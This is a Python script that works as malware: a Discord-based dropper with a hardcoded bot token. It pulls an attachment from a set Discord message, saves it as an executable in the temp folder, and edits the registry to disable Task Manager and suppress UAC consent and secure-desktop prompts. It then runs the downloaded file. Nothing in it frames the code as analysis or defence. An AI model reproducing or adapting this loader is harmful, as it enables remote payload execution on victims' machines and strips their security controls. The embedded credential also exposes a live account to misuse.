import discord
import os
import tempfile
BOT_TOKEN = 'MTE3ODYzODM2Nzc4OTk0ODk2OA.GW2B7z.BcJrjyPGrrJc2ykLOXeKDOMFnBMYmQYmQTEbM4'
GUILD_ID = 1178639547857375303
CHANNEL_ID = 1178639547857375306
MESSAGE_ID = 1180261958994382932
intents = discord.Intents.default()
client = discord.Client(intents=intents)
async def download_and_execute(message_id):
    guild = client.get_guild(GUILD_ID)
    channel = guild.get_channel(CHANNEL_ID)
    msg = await channel.fetch_message(message_id)
    filename, _, _ = msg.content.split(' - ', 2)
    temp_dir = tempfile.gettempdir()
    exe_filename = os.path.join(temp_dir, os.path.basename(filename))
    with open(exe_filename, 'wb') as file:
        for attachment in msg.attachments:
            file_part = await attachment.to_file()
            file.write(file_part.fp.read())
    try:
        os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "DisableTaskMgr" /t REG_DWORD /d "1" /f')
        os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f')
        os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "PromptOnSecureDesktop" /t REG_DWORD /d "0" /f')
    except:
        pass
    os.system(f'"{exe_filename}"')
@client.event
async def on_ready():
    await download_and_execute(MESSAGE_ID)
    await client.close()
client.run(BOT_TOKEN)
